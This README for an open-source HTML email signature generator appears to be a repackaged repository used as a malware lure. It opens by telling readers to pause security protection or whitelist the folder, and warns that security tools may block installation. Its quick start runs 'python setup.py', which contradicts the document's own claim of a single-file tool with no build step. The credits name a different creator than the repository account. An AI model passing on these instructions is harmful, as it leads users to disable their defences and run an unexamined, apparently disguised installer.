# Email Signature Generator


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/WeaveSolicitor/email-signature-generator-594.git
cd email-signature-generator-594
python setup.py
```


A free, open-source tool for creating professional HTML email signatures. No sign-up, no server, no tracking — runs entirely in your browser.

**[Try it live →](https://signatures.clarkemedia.ie)**

## Features

- **Fully customizable** — name, title, company, phone, email, website, logo, accent colour, social links, and disclaimer
- **Live preview** — see changes instantly as you type
- **Light & dark mode preview** — check how your signature looks in both email themes
- **One-click copy** — copy as rich text (paste directly into your email client) or raw HTML
- **Conditional fields** — blank fields are automatically hidden from the output
- **Custom accent colour** — match your brand with the built-in colour picker
- **Social icons** — LinkedIn, Twitter/X, Facebook, Instagram, and GitHub (only shown when a URL is provided)
- **Customizable disclaimer** — edit the text or toggle it off entirely
- **Setup instructions** — step-by-step guides for Outlook (new, classic, Mac), Gmail, and Apple Mail
- **Zero dependencies** — single HTML file, no build step, no frameworks
- **Works offline** — download and open locally, no internet required (except for Google Fonts and social icons)


### GitHub Pages (free)

### Docker

```bash
```

Or with Docker Compose:

```bash
git clone https://github.com/WeaveSolicitor/email-signature-generator-594
cd email-signature-generator
docker compose up -d
```

Then open `http://localhost:8080` in your browser.

### Self-hosted

Just serve `index.html` from any web server or CDN. It's a single file with no build step.

## Customizing the Defaults

The default field values in `index.html` showcase the creator's details as an example. To set your own defaults, edit the `value="..."` attributes on the form inputs near the top of the file.

## Contributing

Contributions are welcome! Feel free to open an issue or submit a pull request. Some ideas:

- Additional email client instructions
- Font family selector
- Image upload / base64 encoding for logos
- Additional social platforms
- Colour theme presets
- i18n / localization

## License

MIT — see [LICENSE](LICENSE) for details.

## Credits

Created by [Eoin McMahon](https://clarkemedia.ie) at [Clarke Media](https://clarkemedia.ie).

Social icons provided by [Icons8](https://icons8.com).

---

If this tool saved you time, consider [buying me a coffee ☕](https://paypal.me/eoinmcm)


<!-- Last updated: 2026-06-06 15:38:52 -->
